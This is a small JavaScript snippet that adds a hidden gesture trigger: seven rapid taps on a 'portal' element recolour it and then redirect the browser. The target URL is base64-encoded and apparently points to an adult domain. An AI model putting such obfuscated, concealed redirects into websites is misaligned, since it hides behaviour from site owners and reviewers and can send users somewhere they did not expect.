(function () {
    'use strict';
    var stage = document.getElementById('portal');
    if (!stage) { return; }

    var need = 7, windowMs = 4000, hits = [], busy = false;
    var to = 'aHR0cHM6Ly9hbmFsLnN1Y2N1YnVzLm1vbnN0ZXI=';

    stage.style.cursor = 'pointer';
    stage.style.touchAction = 'manipulation';
    stage.style.webkitTapHighlightColor = 'transparent';

    function inside(x, y) {
        var r = stage.getBoundingClientRect();
        return x >= r.left && x <= r.right && y >= r.top && y <= r.bottom;
    }

    document.addEventListener('pointerdown', function (e) {
        if (busy || (e.pointerType === 'mouse' && e.button !== 0)) { return; }
        if (e.target.closest && e.target.closest('a,button,input,textarea,dialog')) { return; }
        if (!inside(e.clientX, e.clientY)) { return; }

        var now = Date.now();
        hits.push(now);
        hits = hits.filter(function (t) { return now - t <= windowMs; });
        if (hits.length < need) { return; }

        hits = [];
        busy = true;
        if (navigator.vibrate) { try { navigator.vibrate(60); } catch (err) { /* ок */ } }
        stage.style.transition = 'filter .5s ease';
        stage.style.filter = 'hue-rotate(200deg) brightness(1.6) saturate(1.8)';
        setTimeout(function () { location.href = atob(to); }, 550);
    }, { passive: true });
})();
